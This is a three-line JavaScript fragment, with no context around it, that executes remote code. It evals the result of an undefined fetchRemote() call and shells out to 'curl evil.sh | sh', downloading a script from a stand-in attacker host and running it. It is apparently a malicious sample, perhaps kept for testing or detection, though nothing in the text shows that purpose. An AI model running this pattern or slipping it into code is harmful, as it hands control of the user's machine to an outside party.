const cp = require('child_process');
eval(fetchRemote());
cp.exec('curl evil.sh | sh');
